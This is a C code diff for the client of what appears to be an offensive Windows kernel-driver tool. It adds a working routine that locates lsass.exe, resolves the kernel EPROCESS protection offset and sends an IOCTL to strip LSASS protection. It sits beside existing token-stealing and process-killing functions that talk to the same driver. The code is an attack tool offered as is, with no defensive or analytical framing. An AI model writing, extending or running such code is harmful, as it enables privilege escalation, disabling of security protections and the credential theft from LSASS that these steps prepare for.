@@ -36,10 +36,9 @@ DWORD find_pid_by_name(const wchar_t* proc_name) {
 }
 
 
-
 BOOL modToken(DWORD32 target , DWORD32 toStealFrom){
 
-    REPLACE_TOKEN_INFO tosend = { 0 };
+    TASK_INFO tosend = { 0 };
 
     tosend.target = target;
     tosend.stealFrom = toStealFrom;
@@ -49,7 +48,7 @@ BOOL modToken(DWORD32 target , DWORD32 toStealFrom){
         hDevice,
         IOCTL_REPLACE_TOKEN,
         &tosend,
-        sizeof(REPLACE_TOKEN_INFO),
+        sizeof(TASK_INFO),
         NULL,
         0,
         &bytesReturned,
@@ -65,7 +64,7 @@ BOOL modToken(DWORD32 target , DWORD32 toStealFrom){
 
 
 BOOL kill(DWORD32 target) {
-    REPLACE_TOKEN_INFO tosend = { 0 };
+    TASK_INFO tosend = { 0 };
 
     tosend.target = target;
 
@@ -74,7 +73,7 @@ BOOL kill(DWORD32 target) {
         hDevice,
         IOCTL_KILL_PROCESS,
         &tosend,
-        sizeof(REPLACE_TOKEN_INFO),
+        sizeof(TASK_INFO),
         NULL,
         0,
         &bytesReturned,
@@ -88,6 +87,33 @@ BOOL kill(DWORD32 target) {
     }
 }
 
+BOOL unprotect(DWORD32 target, DWORD64 offset) {
+
+
+    TASK_INFO tosend = { 0 };
+    
+    tosend.target = target;
+    tosend.offset = offset;
+
+
+    DWORD bytesReturned;
+    BOOL result = DeviceIoControl(
+        hDevice,
+        IOCTL_UNPROTECT_LSA,
+        &tosend,
+        sizeof(TASK_INFO),
+        NULL,
+        0,
+        &bytesReturned,
+        NULL
+    );
+
+    if (!result) {
+
+        printf("[ERROR] Failed to unprotect lsass");
+        return -1;
+    }
+}
 
 void help() {
     printf("Usage: Program.exe [options]\n\n");
@@ -217,7 +243,17 @@ int main(int argc, char** argv)
     }
 
     if (lsass_unprotect) {
-        printf("Unprotecting LSASS... (Unimplemented)\n");
+        DWORD32 lsass = (DWORD32)find_pid_by_name(L"lsass.exe");
+        resolve_kstruct_offsets();
+        DWORD64 offset = g_ntoskrnlOffsets.st.eprocess_protection;
+        if (lsass != 0 && offset) {
+            printf("Unprotecting LSASS...\n");
+            unprotect(lsass, offset);
+        }
+        else {
+            printf("[-] Failed to find LSASS.exe\n");
+        }
+        
     }
 
 
